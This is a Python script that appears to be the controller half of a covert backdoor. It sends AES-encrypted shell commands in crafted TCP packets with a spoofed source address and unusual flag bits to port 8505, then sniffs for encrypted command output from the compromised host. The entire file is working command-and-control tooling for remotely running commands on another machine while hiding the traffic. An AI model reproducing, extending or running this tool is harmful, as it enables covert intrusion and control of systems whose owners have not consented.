import socket
import sys
from scapy.all import *
from Crypto.Cipher import AES
from Crypto import Random

def usage():
    if len(sys.argv) != 2:
        print "To use: ", sys.argv[0], "[Server IP]"
        sys.exit()

def stopfilter(pkt):
    if ARP in pkt:
        return False
    #if there is no arp in packet go on with the rest of the code
    return True

def encryptCommand(message):
    #Secret key and Salt initialization
    secretKey = "Secret key lost."
    saltySpatoon = "How tough areyou"
    #encryption initialization
    crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
    #encrypt the data
    encryptedData = crypt.encrypt(message)
    return encryptedData

def decryptCommand(message):
    #Secret key and Salt initialization
    secretKey = "Secret key lost."
    saltySpatoon = "How tough areyou"
    #decryption initialization
    crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
    #decrypt the data
    decryptedData = crypt.decrypt(message)
    return decryptedData

def sendCommand():
    global destIP
    global authPacket
    destIP = sys.argv[1]
    #key to authenticating the packet
    authPacket = "Authenticate packets"
    sending = True

    while True:
        if sending:
            #Prompt user for the command they want to send
            command = raw_input('Write your command: ')
            #Encrypt the command with AES encryption
            encryptedCommand = encryptCommand(authPacket + command)
            #Create the packet and store the command in the data field
            pkt = IP(src="192.168.0.10", dst=destIP)/TCP(dport=8505, flags='C')/Raw(load=encryptedCommand)
            #Send the packet
            send(pkt)
            sending = False
        else:
            sniff(timeout=2, filter="tcp and host " + destIP + " and dst port 8505", prn=receiveOutput, stop_filter=stopfilter)
            sending = True


def receiveOutput(pkt):
    global destIP
    global authPacket
    if ARP in pkt:
        return
    elif DHCP in pkt:
        return
    elif pkt[IP].src == destIP:
        flagSet = pkt['TCP'].flags
        if flagSet == long(128):
            #grab the raw data
            pkt.show()
            data = pkt[Raw].load
            #Decrypt the data
            decryptedData = decryptCommand(data)
            #if the decrypted data is authenticated, print it
            if decryptedData.startswith(authPacket) == True:
                output = decryptedData[20:]
                #Print the output
                if output == "exit":
                    sys.exit()
                else:
                    print output

if __name__ == "__main__":
    usage()
    sendCommand()
